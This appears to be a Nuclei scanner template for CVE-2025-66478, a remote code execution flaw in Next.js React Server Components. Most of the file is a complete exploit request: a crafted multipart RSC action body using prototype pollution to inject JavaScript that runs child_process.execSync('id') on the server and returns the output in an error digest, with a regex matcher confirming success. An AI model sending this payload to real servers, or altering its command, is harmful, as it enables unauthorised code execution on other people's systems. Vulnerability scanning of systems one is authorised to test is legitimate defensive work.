id: nextjs-cve-2025-66478-rce-body-id

info:
  name: Next.js RSC RCE CVE-2025-66478 - id in response body
  author: hxorz
  severity: high
  description: |
  This template exploits a Remote Code Execution vulnerability (CVE-2025-66478)
  in Next.js React Server Components (RSC) by crafting a malicious RSC action
  request that injects server-side JavaScript into the execution context.

  The payload forces the application to invoke:
    child_process.execSync('id')

  The command output is embedded into the thrown NEXT_REDIRECT error digest and
  returned inside the RSC response. Successful exploitation is confirmed by
  matching a typical Unix `id` output (for example: uid=1000(...)) in the HTTP
  response body, regardless of the HTTP status code (200, 302, or 500).

  reference:
    - https://github.com/Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478
  tags: nextjs,rce,cve-2025-66478

http:
  - method: POST
    path:
      - "{{BaseURL}}/"

    headers:
      Next-Action: x
      X-Nextjs-Request-Id: b5dce965
      X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad

    body: |
      ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
      Content-Disposition: form-data; name="0"

      {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": "{\"then\":\"$B1337\"}",
        "_response": {
          "_prefix": "var res=process.mainModule.require('child_process').execSync('id',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
          "_chunks": "$Q2",
          "_formData": {
            "get": "$1:constructor:constructor"
          }
        }
      }
      ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
      Content-Disposition: form-data; name="1"

      "$@0"
      ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
      Content-Disposition: form-data; name="2"

      []
      ------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
    matchers:
      - type: regex
        part: body
        regex:
          - "uid=[0-9]+\\([^)]*\\)"

